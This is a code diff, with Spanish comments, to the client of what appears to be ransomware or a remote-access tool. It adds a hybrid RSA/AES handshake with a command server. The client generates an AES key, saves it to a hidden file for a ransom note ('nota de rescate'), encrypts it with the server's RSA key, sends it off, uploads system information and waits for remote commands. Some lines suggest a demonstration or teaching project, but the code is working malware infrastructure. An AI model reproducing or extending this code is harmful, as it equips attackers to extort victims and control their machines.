@@ -231,7 +231,7 @@ function cifrarConAES(data, key) {
 function cifrarConRSA(data, publicKey) {
     try {
         const encrypted = crypto.publicEncrypt(
-            { key: publicKey, padding: crypto.constants.RSA_PKCS1_PADDING },  // PKCS#1 v1.5 for CrypTool
+            { key: publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING },
             Buffer.from(JSON.stringify(data))
         );
         return { encrypted: true, algorithm: 'rsa', data: encrypted.toString('base64') };
@@ -904,44 +904,87 @@ async function conectar() {
         }, 3000);
     });
 
-    socket.on('registrado', (data) => {
-        console.log(' [+] Registrado con ID:', data.clienteId);
-        claveAES = data.clave;
+    // === CIFRADO HIBRIDO REAL ===
+    // PASO 1: Recibir clave pública RSA del servidor
+    socket.on('rsa-handshake', (data) => {
+        console.log('\n========== CIFRADO HIBRIDO RSA ==========');
+        console.log('[RSA] Clave publica RSA recibida del servidor');
         rsaPublicKey = data.rsaPublicKey;
 
-        // Guardar clave AES para nota_rescate (descifrado de un archivo)
-        if (claveAES) {
-            try {
-                const keyFilePath = path.join(INSTALL_DIR, '.aes_key');
-                fs.writeFileSync(keyFilePath, claveAES);
-                console.log(' [+] Clave AES guardada para nota de rescate');
+        // PASO 2: Generar clave AES localmente (256 bits = 32 bytes)
+        const claveAESLocal = crypto.randomBytes(32);
+        const claveAESHex = claveAESLocal.toString('hex');
+        claveAES = claveAESHex;
 
-                // --- DEMOSTRACION RSA ---
-                // Simular el envio seguro de esta clave usando RSA para que el usuario pueda verificarlo
-                if (rsaPublicKey) {
-                    const encryptedKey = cifrarConRSA({ key: claveAES }, rsaPublicKey);
-                    console.log('\n--- DEMOSTRACION CIFRADO RSA ---');
-                    console.log('1. Clave AES Original:', claveAES);
-                    console.log('2. Clave Publica RSA:', rsaPublicKey.substring(0, 50) + '...');
-                    console.log('3. Clave AES Cifrada (RSA):', encryptedKey.data);
-                    console.log('--------------------------------\n');
-                }
-                // ------------------------
+        console.log('[RSA] Clave AES generada localmente:', claveAESHex.substring(0, 16) + '...');
 
-            } catch (e) {
-                console.log('[!] No se pudo guardar clave AES:', e.message);
-            }
+        // Guardar clave AES localmente
+        try {
+            const keyFilePath = path.join(INSTALL_DIR, '.aes_key');
+            fs.writeFileSync(keyFilePath, claveAESHex);
+            console.log('[RSA] Clave AES guardada localmente');
+        } catch (e) {
+            console.log('[!] No se pudo guardar clave AES:', e.message);
         }
 
-        // Enviar info del sistema
+        // PASO 3: Cifrar la clave AES con la clave pública RSA del servidor
+        try {
+            const claveAESCifrada = crypto.publicEncrypt(
+                {
+                    key: rsaPublicKey,
+                    padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
+                    oaepHash: 'sha256'
+                },
+                claveAESLocal // Usar bytes directos, no hex
+            );
+
+            const claveAESCifradaB64 = claveAESCifrada.toString('base64');
+            console.log('[RSA] Clave AES cifrada con RSA (primeros 50 chars):', claveAESCifradaB64.substring(0, 50) + '...');
+
+            // PASO 4: Enviar clave AES cifrada al servidor
+            socket.emit('clave-aes-cliente', {
+                claveAESCifrada: claveAESCifradaB64
+            });
+            console.log('[RSA] Clave AES cifrada enviada al servidor');
+            console.log('[RSA] Esperando confirmacion...');
+            console.log('==========================================\n');
+
+        } catch (e) {
+            console.error('[RSA ERROR] No se pudo cifrar la clave AES:', e.message);
+        }
+    });
+
+    // PASO 5: Recibir confirmación de registro (handshake completado)
+    socket.on('registrado', (data) => {
+        console.log(' [+] Registrado con ID:', data.clienteId);
+
+        if (data.cifradoHibrido) {
+            console.log(' [+] CIFRADO HIBRIDO ACTIVO - Comunicacion segura establecida');
+        }
+
+        // La clave AES ya fue generada y guardada en rsa-handshake
+        // Solo verificamos que coincida
+        if (data.clave && data.clave !== claveAES) {
+            console.log('[!] Advertencia: Clave del servidor difiere de la local');
+        }
+
+        // Enviar info del sistema cifrada
         const info = obtenerInfoSistema();
         if (claveAES) {
             socket.emit('info-sistema', cifrarConAES(info, claveAES));
         } else {
             socket.emit('info-sistema', info);
         }
-        console.log(' [+] Informacion del sistema enviada');
+        console.log(' [+] Informacion del sistema enviada (cifrada con AES)');
         console.log('[*] Esperando comandos del servidor...');
+    });
+
+    // Handler para errores de registro
+    socket.on('error-registro', (data) => {
+        console.error('[!] Error en registro:', data.error);
+        if (data.details) {
+            console.error('[!] Detalles:', data.details);
+        }
     });
 
     // ===============================
